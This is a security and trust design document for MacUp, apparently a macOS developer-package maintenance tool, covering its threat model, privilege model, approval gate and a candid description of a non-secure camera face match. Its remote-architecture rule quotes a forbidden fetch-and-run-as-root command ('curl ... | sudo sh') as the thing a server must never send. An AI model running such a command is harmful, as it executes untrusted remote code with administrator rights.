# Trust and Security

## Trust Contract

MacUp publicly commits to:

1. No hidden changes.
2. Read-only means no package/runtimes are modified.
3. Users can inspect a change before execution.
4. MacUp does not store admin passwords.
5. MacUp uses existing package managers instead of replacing them.
6. Saved exclusions/policies are enforced at execution time.
7. Major/unknown/high-risk changes require review.
8. Local inventory stays local by default.
9. Telemetry is off unless the user opts in.
10. Core behavior is open source.
11. Modification attempts are logged.
12. Rollback claims are capability-specific and truthful.
13. Ambiguity causes MacUp to stop/skip rather than guess.

## Threat model

Assets:
- user's developer environment
- executable search path
- package-manager configuration
- shell/runtime configuration
- credentials present in environment
- local filesystem
- administrator authorization
- trust in signed MacUp releases

Threats:
- command injection via package names/provider output
- PATH hijacking
- malicious or compromised upstream package
- parser confusion causing wrong target
- policy race/change between planning and execution
- accidental privilege escalation
- logging secrets
- corrupted configuration changing policy
- compromised update distribution
- symlink/path attacks on writable files
- malicious project-local config affecting global maintenance
- remote command capability introduced later

Mitigations:
- argument arrays, no shell interpolation
- explicit executable path
- provider output validation
- policy re-check before execute
- local-first
- atomic config
- strict file permissions where appropriate
- log redaction
- signed/notarized release
- checksums
- dependency minimization
- no root daemon
- no remote arbitrary command schema

## Privilege

The main process runs as the user.

Scheduling does not change that. `macup schedule enable` installs a per-user
LaunchAgent in `~/Library/LaunchAgents`, loaded into the user's own launchd
domain (`gui/<uid>`). There is no `LaunchDaemon`, no root, no privilege
helper, no authorization prompt, and no process running between checks. The
scheduled job runs `macup check --save-state`, which cannot install, upgrade,
or remove anything. `macup schedule disable` unloads the job and deletes the
property list, and `macup schedule status` shows the exact command that would
run, so an installed schedule is never something you have to take on trust.


When an operation legitimately needs authorization:
- explain why
- let macOS present standard authorization
- never collect the password in MacUp UI
- avoid custom privilege helpers until a separately reviewed need exists

## Approval, and what it is not

MacUp can require the device owner's approval before it changes anything
(`macup security require on`, or Settings → Approval). macOS does the asking
through `LocalAuthentication`, with whatever sensor the Mac reports — Touch
ID, Face ID, or Optic ID — and the login password or an unlocked Apple Watch
as the fallback. MacUp passes a reason string it wrote itself and receives a
yes or a no. It never sees, stores, or transmits a fingerprint, a face, or a
password, which is the same rule as rule 9 of the trust contract.

It is deliberately described as a confirmation, never as a lock:

- MacUp runs as the user. Anyone at an unlocked Mac can run `brew`, `npm`, or
  `mise` directly, with no prompt from anyone.
- The configuration file is the user's own file and can be edited to turn the
  requirement off. MacUp does not defend against its owner.
- There is no secret for the OS to withhold: v1 has no account, no tokens, and
  no cloud, so there is nothing to put behind a Keychain access-control list,
  which is where macOS would really enforce biometrics.

What it does buy is one deliberate step in front of every change MacUp itself
makes, enforced in one place (`ApprovalGate`) for the CLI and the app alike,
so a future modifying action cannot quietly skip it. Approval that MacUp could
not obtain is a refusal, not a pass.

### The camera face match

MacUp does include a face check of its own, off by default, and it is
documented here rather than advertised, because it is not security.

macOS exposes no face-recognition API: Vision finds *a* face in a picture and
does not tell you whose. What MacUp does is crop to the face and compare
Vision image feature prints — a measure of how alike two pictures look. A
photograph of the enrolled person passes it. There is no Secure Enclave, no
liveness check, and no macOS enforcement behind it.

It is constrained so that it cannot be mistaken for a lock:

- It can only approve early. A face that does not match falls through to the
  macOS prompt rather than refusing, so it can never lock anyone out, and it
  never replaces the macOS check as the only way through.
- It reports `cameraFace`, never `faceID`, so what approved a change is always
  distinguishable from a hardware sensor in the UI, the logs, and `--json`.
- It does nothing unless approval is also required; the validator warns when
  it is on and inert.
- What is stored is a list of numbers derived from the pictures, owner-only in
  the state directory. No image is kept, nothing leaves the Mac, and the
  camera is open only for the moment of capture, recording light on.
- Enrolment reports how far apart the enrolled samples of one face are, so the
  threshold can be judged rather than trusted. When the spread is wider than
  the threshold, MacUp says matching cannot work.

If this feature were ever presented as protecting anything, that would be
misrepresentation. It is a convenience for its owner, on their own machine,
and every surface that shows it says so.

## Remote architecture rule

If cloud/team functionality exists later, the server may express declarative desired state/policy, never arbitrary shell commands.

Allowed concept:
```json
{"tool":"node","policy":"pin","version":"24"}
```

Forbidden concept:
```json
{"command":"curl https://example | sudo sh"}
```

## Release security

Before public v1:
- Developer ID signature
- Apple notarization
- SHA-256 checksums
- GitHub protected release workflow
- documented build steps
- security reporting process
- dependency lock/review
- no secrets in repository or CI logs

## Incident principle

If MacUp causes or risks destructive behavior:
- stop release/update distribution if necessary
- disclose concrete scope
- provide remediation
- do not minimize impact
- add regression tests before restoring affected functionality
